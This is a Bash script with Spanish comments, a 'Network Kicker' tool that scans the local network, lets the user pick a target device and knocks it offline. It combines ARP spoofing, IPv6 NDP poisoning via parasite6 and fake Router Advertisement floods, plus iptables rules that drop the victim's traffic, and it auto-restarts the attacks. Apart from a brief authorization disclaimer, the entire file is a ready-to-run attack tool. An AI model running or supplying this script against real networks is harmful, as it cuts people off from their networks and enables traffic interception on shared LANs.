#!/bin/bash
# ============================================================
#   AndresGonzalezDev - Network Kicker Tool v2.0
#   Dual Stack: ARP spoofing (IPv4) + NDP poisoning (IPv6)
#   USO EXCLUSIVO EN REDES PROPIAS O CON AUTORIZACIÓN
# ============================================================

# ── ROOT CHECK ───────────────────────────────────────────────
if [ "$EUID" -ne 0 ]; then
    echo -e "\e[31m[!] Ejecuta con sudo.\e[0m"
    exit 1
fi

# ── BANNER ───────────────────────────────────────────────────
clear
echo -e "\e[36m"
cat << "EOF"
    _               _                ____             
   / \   _ __   __| |_ __ ___  ___|  _ \  _____   __
  / _ \ | '_ \ / _` | '__/ _ \/ __| | | |/ _ \ \ / /
 / ___ \| | | | (_| | | |  __/\__ \ |_| |  __/\ V / 
/_/   \_\_| |_|\__,_|_|  \___||___/____/ \___| \_/  
      AndresGonzalezDev | Network Kicker v2.0
         IPv4 ARP Spoof + IPv6 NDP Poison
EOF
echo -e "\e[0m"

# ── VERIFICAR E INSTALAR HERRAMIENTAS ────────────────────────
instalar_si_falta() {
    local cmd="$1"
    local pkg="${2:-$1}"
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "\e[33m[~] Instalando $pkg...\e[0m"
        apt-get update -qq && apt-get install -y -qq "$pkg"
    else
        echo -e "\e[32m[✓] $cmd disponible\e[0m"
    fi
}

instalar_si_falta arpspoof dsniff
instalar_si_falta nmap     nmap
instalar_si_falta arping   arping
# thc-ipv6 provee parasite6 y flood_router6
if ! dpkg -l thc-ipv6 &>/dev/null; then
    echo -e "\e[33m[~] Instalando thc-ipv6...\e[0m"
    apt-get update -qq && apt-get install -y -qq thc-ipv6
fi

# Detectar nombre correcto del binario (varía entre versiones de thc-ipv6)
if   command -v atk6-parasite6     &>/dev/null; then PARASITE6="atk6-parasite6"
elif command -v parasite6          &>/dev/null; then PARASITE6="parasite6"
else PARASITE6=""; echo -e "\e[31m[!] parasite6 no encontrado.\e[0m"; fi

if   command -v atk6-flood_router6 &>/dev/null; then FLOOD_ROUTER6="atk6-flood_router6"
elif command -v flood_router6      &>/dev/null; then FLOOD_ROUTER6="flood_router6"
else FLOOD_ROUTER6=""; fi

# ── ADVERTENCIA VIRTUALBOX ────────────────────────────────────
echo -e "\n\e[33m[!] IMPORTANTE para VirtualBox:\e[0m"
echo -e "    El adaptador DEBE estar en modo \e[1mAdaptador Puente (Bridged)\e[0m"
echo -e "    En modo NAT el ataque NO llega a otros dispositivos.\n"
read -p "    ¿Confirmás modo Bridged? [s/N]: " confirm
[[ "$confirm" != "s" && "$confirm" != "S" ]] && echo "Configurá el adaptador y volvé a ejecutar." && exit 1

# ── GUARDAR ESTADO ORIGINAL ───────────────────────────────────
IP_FORWARD_ORIGINAL=$(cat /proc/sys/net/ipv4/ip_forward)
IPV6_ORIGINAL=$(cat /proc/sys/net/ipv6/conf/all/disable_ipv6 2>/dev/null || echo 0)

# ── DETECCIÓN DE RED ──────────────────────────────────────────
interfaz=$(ip route show default | awk '/default/ {print $5}' | head -n1)
gateway=$(ip route show default  | awk '/default/ {print $3}' | head -n1)
mi_ip=$(ip -4 addr show "$interfaz" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1 | head -n1)
mi_ipv6=$(ip -6 addr show "$interfaz" 2>/dev/null | awk '/inet6.*global/ {print $2}' | cut -d/ -f1 | head -n1)

if [ -z "$interfaz" ] || [ -z "$gateway" ]; then
    echo -e "\n\e[33m[!] Detección automática falló. Configuración manual:\e[0m"
    ip -br link show | grep -v "lo" | awk '{print "  -", $1, $3}'
    read -p "Interfaz (ej: eth0, wlan0): " interfaz
    read -p "IP del Router: " gateway
    mi_ip=$(ip -4 addr show "$interfaz" | awk '/inet / {print $2}' | cut -d/ -f1)
    mi_ipv6=$(ip -6 addr show "$interfaz" | awk '/inet6.*global/ {print $2}' | cut -d/ -f1 | head -n1)
fi

rango_red=$(echo "$gateway" | cut -d. -f1-3).0/24
mac_interfaz=$(cat /sys/class/net/"$interfaz"/address 2>/dev/null)

echo -e "\n\e[34m┌──────────────────────────────────────────────────┐\e[0m"
echo -e "\e[34m│\e[0m  Red IPv4  : \e[32m$rango_red\e[0m"
echo -e "\e[34m│\e[0m  Interfaz  : \e[32m$interfaz\e[0m  [$mac_interfaz]"
echo -e "\e[34m│\e[0m  Router    : \e[32m$gateway\e[0m"
echo -e "\e[34m│\e[0m  Mi IPv4   : \e[32m$mi_ip\e[0m"
echo -e "\e[34m│\e[0m  Mi IPv6   : \e[32m${mi_ipv6:-no detectado}\e[0m"
echo -e "\e[34m└──────────────────────────────────────────────────┘\e[0m\n"

# ── ESCANEO DE DISPOSITIVOS ───────────────────────────────────
echo -e "\e[36m[~] Escaneando red $rango_red ...\e[0m"
mapfile -t DISPOSITIVOS < <(
    nmap -sn -T4 "$rango_red" 2>/dev/null \
    | awk '/Nmap scan report/{ip=$NF} /MAC Address/{print ip, $3, substr($0, index($0,$4))}' \
    | grep -v "$mi_ip" | sed 's/[()]//g'
)

# Fallback si no detecta MACs (común en VMs)
if [ ${#DISPOSITIVOS[@]} -eq 0 ]; then
    mapfile -t DISPOSITIVOS < <(
        nmap -sn -T4 "$rango_red" 2>/dev/null \
        | grep "Nmap scan report" \
        | awk '{print $NF}' \
        | grep -v "$mi_ip" \
        | sed 's/[()]//g'
    )
fi

echo -e "\n\e[32m[✓] Dispositivos encontrados:\e[0m\n"
i=1
declare -A IP_MAP
for d in "${DISPOSITIVOS[@]}"; do
    ip_d=$(echo "$d" | awk '{print $1}' | tr -d '()')
    info=$(echo "$d" | cut -d' ' -f2-)
    printf "  \e[33m[%2d]\e[0m  %-18s %s\n" "$i" "$ip_d" "$info"
    IP_MAP[$i]="$ip_d"
    ((i++))
done

echo ""
read -p "Número o IP del objetivo: " seleccion
if [[ "$seleccion" =~ ^[0-9]+$ ]] && [ -n "${IP_MAP[$seleccion]}" ]; then
    ip_victima="${IP_MAP[$seleccion]}"
else
    ip_victima="$seleccion"
fi

# Validaciones de seguridad
if [ "$ip_victima" = "$gateway" ]; then
    echo -e "\e[31m[!] No podés atacar al router.\e[0m"; exit 1
fi
if [ "$ip_victima" = "$mi_ip" ]; then
    echo -e "\e[31m[!] No podés atacarte a vos mismo.\e[0m"; exit 1
fi

# ── OBTENER MAC E IPv6 DE LA VÍCTIMA ─────────────────────────
echo -e "\n\e[36m[~] Recopilando info de $ip_victima ...\e[0m"
ping -c 2 -W 1 "$ip_victima" &>/dev/null
mac_victima=$(arp -n "$ip_victima" 2>/dev/null | awk '/ether/{print $3}')
[ -z "$mac_victima" ] && mac_victima=$(nmap -sn "$ip_victima" 2>/dev/null | awk '/MAC Address/{print $3}')

# Buscar IPv6 de la víctima en la tabla de vecinos
ipv6_victima=$(ip -6 neigh show dev "$interfaz" 2>/dev/null \
    | awk '{print $1, $5}' \
    | grep -i "$mac_victima" \
    | awk '{print $1}' \
    | grep -v '^fe80' | head -n1)

echo -e "\e[34m┌──────────────────────────────────────────────────┐\e[0m"
echo -e "\e[34m│\e[0m  Objetivo IPv4 : \e[31m$ip_victima\e[0m"
echo -e "\e[34m│\e[0m  MAC           : \e[31m${mac_victima:-no obtenida}\e[0m"
echo -e "\e[34m│\e[0m  IPv6 global   : \e[31m${ipv6_victima:-no detectado}\e[0m"
echo -e "\e[34m└──────────────────────────────────────────────────┘\e[0m"

# ── FUNCIÓN DE LIMPIEZA COMPLETA ──────────────────────────────
limpiar() {
    echo -e "\n\e[33m[!] Deteniendo ataque y restaurando red...\e[0m"

    pkill -f "arpspoof"         2>/dev/null
    pkill -f "parasite6"        2>/dev/null
    pkill -f "flood_router6"    2>/dev/null
    pkill -f "atk6-"            2>/dev/null
    sleep 1

    echo "$IP_FORWARD_ORIGINAL" > /proc/sys/net/ipv4/ip_forward
    echo 0 > /proc/sys/net/ipv6/conf/all/forwarding              2>/dev/null
    echo "$IPV6_ORIGINAL" > /proc/sys/net/ipv6/conf/all/disable_ipv6     2>/dev/null
    echo "$IPV6_ORIGINAL" > /proc/sys/net/ipv6/conf/default/disable_ipv6 2>/dev/null

    iptables  -D FORWARD -s "$ip_victima" -j REJECT 2>/dev/null
    iptables  -D FORWARD -d "$ip_victima" -j REJECT 2>/dev/null
    ip6tables -D FORWARD -j DROP                    2>/dev/null
    if [ -n "$ipv6_victima" ]; then
        ip6tables -D FORWARD -s "$ipv6_victima" -j REJECT 2>/dev/null
        ip6tables -D FORWARD -d "$ipv6_victima" -j REJECT 2>/dev/null
    fi

    if command -v arping &>/dev/null && [ -n "$mac_victima" ]; then
        arping -c 5 -I "$interfaz" -s "$gateway"    "$ip_victima" &>/dev/null &
        arping -c 5 -I "$interfaz" -s "$ip_victima" "$gateway"    &>/dev/null &
    fi

    echo -e "\e[32m[✓] Red restaurada. El objetivo debería reconectarse en segundos.\e[0m"
    exit 0
}

trap limpiar INT TERM

# ── ACTIVAR BLOQUEO DUAL STACK ────────────────────────────────
echo -e "\n\e[31m══════════════════════════════════════════════════════\e[0m"
echo -e "\e[41;1m   ATAQUE DUAL STACK ACTIVO — $ip_victima   \e[0m"
echo -e "\e[31m══════════════════════════════════════════════════════\e[0m\n"

# IPv4: cortar reenvío
echo 0 > /proc/sys/net/ipv4/ip_forward
echo -e "\e[32m[✓] IPv4 forward: BLOQUEADO\e[0m"
iptables -I FORWARD 1 -s "$ip_victima" -j REJECT --reject-with icmp-host-unreachable
iptables -I FORWARD 1 -d "$ip_victima" -j REJECT --reject-with icmp-host-unreachable

# IPv6: bloquear forwarding (NO deshabilitar IPv6 porque parasite6 lo necesita)
echo 0 > /proc/sys/net/ipv6/conf/all/forwarding 2>/dev/null
echo -e "\e[32m[✓] IPv6 forward: BLOQUEADO\e[0m"
ip6tables -I FORWARD 1 -j DROP
if [ -n "$ipv6_victima" ]; then
    ip6tables -I FORWARD 1 -s "$ipv6_victima" -j REJECT 2>/dev/null
    ip6tables -I FORWARD 1 -d "$ipv6_victima" -j REJECT 2>/dev/null
    echo -e "\e[32m[✓] ip6tables: Bloqueando $ipv6_victima\e[0m"
fi

# ── LANZAR LOS 3 VECTORES DE ATAQUE ──────────────────────────
echo -e "\n\e[36m[~] Lanzando vectores...\e[0m\n"

# Vector 1 — ARP spoofing IPv4 bidireccional
arpspoof -i "$interfaz" -t "$ip_victima" "$gateway"    > /dev/null 2>&1 & PID_ARP1=$!
arpspoof -i "$interfaz" -t "$gateway"    "$ip_victima" > /dev/null 2>&1 & PID_ARP2=$!
echo -e "  \e[32m[✓] Vector 1:\e[0m ARP spoofing IPv4 (PIDs $PID_ARP1 / $PID_ARP2)"

# Vector 2 — NDP poisoning IPv6 con parasite6
PID_NDP=""
if [ -n "$PARASITE6" ]; then
    # parasite6 responde a TODOS los Neighbor Solicitation de la red
    # haciéndose pasar por cualquier host → víctima cree que nuestra
    # MAC es la del router IPv6
    "$PARASITE6" "$interfaz" > /dev/null 2>&1 & PID_NDP=$!
    echo -e "  \e[32m[✓] Vector 2:\e[0m NDP poisoning IPv6 via $PARASITE6 (PID $PID_NDP)"
else
    echo -e "  \e[31m[✗] Vector 2:\e[0m parasite6 no disponible"
fi

# Vector 3 — Flood de Router Advertisements falsos
PID_RA=""
if [ -n "$FLOOD_ROUTER6" ]; then
    # Inunda con RA falsos → el dispositivo pierde track de su
    # gateway IPv6 real y queda sin ruta de salida
    "$FLOOD_ROUTER6" "$interfaz" > /dev/null 2>&1 & PID_RA=$!
    echo -e "  \e[32m[✓] Vector 3:\e[0m Flood Router Advertisements IPv6 (PID $PID_RA)"
else
    echo -e "  \e[33m[~] Vector 3:\e[0m flood_router6 no disponible"
fi

echo -e "\n\e[90m  Presioná Ctrl+C para detener y restaurar la red.\e[0m\n"

# ── MONITOR EN VIVO CON AUTO-RESTART ─────────────────────────
elapsed=0
while true; do
    # Auto-restart si algún proceso muere
    if ! kill -0 "$PID_ARP1" 2>/dev/null || ! kill -0 "$PID_ARP2" 2>/dev/null; then
        arpspoof -i "$interfaz" -t "$ip_victima" "$gateway"    > /dev/null 2>&1 & PID_ARP1=$!
        arpspoof -i "$interfaz" -t "$gateway"    "$ip_victima" > /dev/null 2>&1 & PID_ARP2=$!
    fi
    if [ -n "$PARASITE6" ] && [ -n "$PID_NDP" ] && ! kill -0 "$PID_NDP" 2>/dev/null; then
        "$PARASITE6" "$interfaz" > /dev/null 2>&1 & PID_NDP=$!
    fi
    if [ -n "$FLOOD_ROUTER6" ] && [ -n "$PID_RA" ] && ! kill -0 "$PID_RA" 2>/dev/null; then
        "$FLOOD_ROUTER6" "$interfaz" > /dev/null 2>&1 & PID_RA=$!
    fi

    # Status line
    v4=$( kill -0 "$PID_ARP1" 2>/dev/null && echo -e "\e[32m●ARP4\e[0m" || echo -e "\e[31m✗ARP4\e[0m" )
    v2=$( [ -n "$PID_NDP" ] && kill -0 "$PID_NDP" 2>/dev/null && echo -e " \e[32m●NDP6\e[0m" || echo -e " \e[33m-NDP6\e[0m" )
    v3=$( [ -n "$PID_RA"  ] && kill -0 "$PID_RA"  2>/dev/null && echo -e " \e[32m●RA6\e[0m"  || echo "" )

    echo -ne "\r  $v4$v2$v3  | \e[33m${elapsed}s\e[0m | \e[31m$ip_victima\e[0m   "
    sleep 5
    ((elapsed+=5))
done
